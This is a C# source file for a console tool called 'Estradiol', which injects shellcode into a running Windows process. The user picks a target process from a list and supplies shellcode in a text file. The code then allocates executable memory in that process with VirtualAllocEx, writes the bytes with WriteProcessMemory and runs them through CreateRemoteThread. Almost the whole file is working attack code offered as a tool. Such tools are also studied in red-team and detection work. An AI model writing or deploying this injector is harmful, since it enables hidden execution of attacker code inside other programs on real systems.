using System.Diagnostics;
using System.Net.NetworkInformation;
using System.Runtime.CompilerServices;
using System.Runtime.ExceptionServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;

class injector
{

    // All impors from https://www.pinvoke.net/
    // import WriteProcessMemory from kernel32

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,byte[] lpBuffer,uint nSize,out IntPtr lpNumberOfBytesWritten);

    // Import VirtualALlocEX to allocate memory for our injection 

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    //Import CreateRemoteThread

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    // Import GetModuleHandle

    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    // Import GetProcAddress

    [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    //Create Dictionary of usable injection types

    static string type;
    static Process proc_to_inj;
    static byte[] buffer;


    static void logo()
    {
        // Print "Logo"
        Console.ForegroundColor = ConsoleColor.Magenta;
        Console.WriteLine("\r\n███████╗░██████╗████████╗██████╗░░█████╗░██████╗░██╗░█████╗░██╗░░░░░\r\n██╔════╝██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗██║██╔══██╗██║░░░░░\r\n█████╗░░╚█████╗░░░░██║░░░██████╔╝███████║██║░░██║██║██║░░██║██║░░░░░\r\n██╔══╝░░░╚═══██╗░░░██║░░░██╔══██╗██╔══██║██║░░██║██║██║░░██║██║░░░░░\r\n███████╗██████╔╝░░░██║░░░██║░░██║██║░░██║██████╔╝██║╚█████╔╝███████╗\r\n╚══════╝╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═╝░╚════╝░╚══════╝");
        Console.WriteLine("");
        Console.ForegroundColor = ConsoleColor.White;
    }

    static string selectInjectionType()
    {
        string res = "";
        Console.Write("");
        Console.WriteLine("Welcome to Estradiol!");
        Console.WriteLine("Injection type: ");
        Console.WriteLine("1. Shellcode");
        Console.WriteLine("2. Dynamic Link Library ( Soon )");

        while(!res.Equals("1"))
        {
            res = Console.ReadLine();

            if(res.Equals("1"))
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("Successfully selected Shellcode as Injection type");
                Console.ForegroundColor = ConsoleColor.White;
                break;
            }

            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine(res + " is not a valid Injection type");
            Console.ForegroundColor = ConsoleColor.White;

        }

        return res;
    }

    static Process selectProcess()
    {
        Process[] available_procs = Process.GetProcesses();
        Process final_proc = null;
        bool valid_proc = false;

        for ( int i = 0; i < available_procs.Length ; i++)
        {
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine($"[{i + 1}] {available_procs[i].ProcessName}");
            Thread.Sleep(10);
        }

        Console.ForegroundColor = ConsoleColor.White;

        Console.WriteLine($"All available Processes listed above [{available_procs.Length}]");
        Console.WriteLine("Enter a Process name: ");

        while (!valid_proc)
        {
            
            string process = Console.ReadLine();

            foreach(Process proc in available_procs)
            {
                if (process.Equals(proc.ProcessName))
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine($"[+] Process {proc.ProcessName} was found!");
                    Console.WriteLine( $"[+] Shellcode will be injected into {proc}");
                    final_proc = proc;
                    valid_proc = true;
                    Console.ForegroundColor = ConsoleColor.White;
                    break;
                }
            }

            if(valid_proc)
            {
                break;
            }

            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine($"The process {process} cant be found!");
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("Enter a valid proc name");
        }

        return final_proc;

    }

    static byte[] selectInjectionCode()
    {
        Console.WriteLine("");
        Console.WriteLine("Enter path of code to inject ");
        Console.WriteLine("( Store shellcode in .txt )");
        string path = "";
        byte[] res = { };

        while(true)
        {
            path = Path.GetFullPath( Console.ReadLine() );

            if(File.Exists(path))
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("[+] File was found");
                Console.WriteLine("[+] Converting file contents to ByteArray");
                Thread.Sleep(500);
                Console.ForegroundColor = ConsoleColor.White;
                
                string shellcode = Regex.Unescape(File.ReadAllText(path));

                //Shellcode to ByteArray conversion
                res = new byte [shellcode.Length];
                Console.ForegroundColor = ConsoleColor.Yellow;

                for (int i = 0; i < shellcode.Length; i++)
                {
                    res[i] = (byte) shellcode[i];
                    Console.WriteLine($"[+] Current byte: {(byte)shellcode[i]}");
                    Thread.Sleep(25);

                }

                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("[+] Successfully converted file contents to ByteArray");
                Console.ForegroundColor = ConsoleColor.White;
                
                break;

            }

            Console.WriteLine($"[-] File at path {path} was not found");

        }
        
        return res;

    }

    static void inject(byte[] code , Process proc)
    {

        // get process handle
        Console.ForegroundColor = ConsoleColor.Cyan;
        Console.WriteLine("[?] Getting proc handle");
        Console.ForegroundColor = ConsoleColor.White;
        IntPtr proc_handle = proc.Handle;
        Thread.Sleep(500);

        if (proc_handle == IntPtr.Zero)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("[~] Unable to retreive proc handle");
            Console.ForegroundColor = ConsoleColor.White;
            Environment.Exit(0);
        }
        
        Console.ForegroundColor = ConsoleColor.Yellow;
        Console.WriteLine("[+] Successfully retreived proc handle");
        Console.ForegroundColor = ConsoleColor.White;

        //Print the address of the proc handle
        Console.ForegroundColor = ConsoleColor.Cyan;
        Console.WriteLine("[?] Allocating memory to: 0x" + proc_handle.ToString("X"));
        Console.ForegroundColor = ConsoleColor.White;
        Thread.Sleep(500);

        IntPtr alloc_addr =  VirtualAllocEx(proc_handle, IntPtr.Zero, (uint) code.Length, 0x1000 | 0x2000, 0x40); // Commit | Reserve , ExecuteReadWrite @pinvoke

        if (alloc_addr == IntPtr.Zero)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("[~] Unable to allocate memory");
            Console.ForegroundColor = ConsoleColor.White;
            Environment.Exit(0);
        }
        
        Console.ForegroundColor = ConsoleColor.Yellow;
        Console.WriteLine("[+] Successfully allocated memory to: 0x" + proc_handle.ToString("X"));
        Console.ForegroundColor = ConsoleColor.White;


        //Write bytecode to memory of target proc
        Console.ForegroundColor = ConsoleColor.Cyan;
        Console.WriteLine($"[?] Mapping {buffer.Length} bytes to allocated memory address: 0x" + alloc_addr.ToString("X"));
        Console.ForegroundColor = ConsoleColor.White;
        Thread.Sleep(2000);

        IntPtr written_bytes;
        bool mem_success = WriteProcessMemory(proc_handle, alloc_addr, code, (uint) code.Length, out written_bytes);

        if (!mem_success)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("[~] Unable to map bytecode to memory at: 0x" + alloc_addr.ToString("X"));
            Console.ForegroundColor = ConsoleColor.White;
            Environment.Exit(0);
        }

        Console.ForegroundColor = ConsoleColor.Yellow;
        Console.WriteLine("[+] Successfully mapped bytecode into memory at: 0x" + alloc_addr.ToString("X"));
        Console.ForegroundColor = ConsoleColor.White;

        //Create a remote thread to execute loadlibrary

        Console.ForegroundColor = ConsoleColor.Cyan;
        Console.WriteLine("[+] Creating remote thread to execute bytecode");
        Console.ForegroundColor = ConsoleColor.White;
        Thread.Sleep(500);    

        IntPtr thread_handle = CreateRemoteThread(proc_handle, IntPtr.Zero, 0, alloc_addr, IntPtr.Zero, 0, IntPtr.Zero);
        
        if (thread_handle == IntPtr.Zero)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("[~] Unable to create remote thread");
            Console.ForegroundColor = ConsoleColor.White;
            Environment.Exit(0);
        }
        
        Console.ForegroundColor = ConsoleColor.Yellow;
        Console.WriteLine("[+] Successfully created remote thread");
        Console.WriteLine("[+] Successfully executed bytecode");
        Console.ForegroundColor = ConsoleColor.White;

    }


    static void Main(string[] args)
    {
        logo();
        type = selectInjectionType();
        proc_to_inj = selectProcess();
        buffer = selectInjectionCode();
        inject(buffer, proc_to_inj);
    } 

}
